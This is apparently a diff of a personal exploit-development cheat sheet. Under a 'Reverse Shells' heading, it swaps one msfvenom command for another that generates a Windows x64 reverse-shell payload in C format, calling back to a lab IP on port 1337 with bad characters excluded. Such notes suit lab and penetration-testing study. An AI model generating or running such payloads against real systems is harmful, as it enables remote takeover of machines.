@@ -9,7 +9,7 @@ description: 06/08/2022
 ### Reverse Shells
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.76.128 LPORT=1337 -f c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.76.128 LPORT=1337 -f c -b \x00\x0a\x0d\x20
 ```
 
 ### Windows Message Box
